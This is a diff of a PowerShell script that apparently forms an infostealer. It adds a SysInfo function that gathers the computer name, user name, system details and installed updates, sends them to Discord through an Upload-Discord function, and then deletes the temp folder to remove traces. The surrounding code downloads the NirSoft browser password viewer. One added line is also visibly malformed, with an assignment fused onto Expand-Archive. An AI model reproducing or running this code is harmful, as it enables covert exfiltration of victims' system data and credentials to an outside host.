@@ -5,9 +5,54 @@ function Get-Nirsoft {
   cd \temp
   Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
-  Expand-Archive 7z.zip 
+  Expand-Archive 7z.zip $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
   .\7z\7za.exe e wbpv.zip
 
+}
+
+function SysInfo {
+#Making sure that my path is on C:\ and creating a \temp folder, then go inside that folder to execute everything
+cd C:\
+mkdir \temp
+cd \temp
+
+#1. Get User Informations
+# Get the date at the selected format
+$date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
+# Get computer name and user name
+$namepc = $env:computername
+$user = $env:UserName
+# Creates the files with the format i want
+$userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
+# Writes the output of $userInfo to "userInfo.txt"
+$userInfo | Out-File -FilePath "C:\Temp\userInfo.txt" -Encoding utf8
+
+#2. Get Computer Informations
+#Create the file to store the info
+$computerInfo = Get-ComputerInfo | Out-String
+#Get info and then store it to the file
+Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8
+
+#3. Generating a report of updates installed on the computer
+$userDir = "C:\Temp"
+$fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
+$date = Get-Date
+$Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
+
+$UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
+foreach ($Update in $UpdatesInfo) {
+    $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
+}
+
+$Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8
+
+#Upload files to Discord via the Upload-Discord function
+Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
+Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
+Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
+
+#Removing every file to remove traces
+rmdir -R \temp
 }
 
 function Upload-Discord {
@@ -55,5 +100,3 @@ function version-av {
   cd C:\
   rmdir -R \temp
 }
-
-
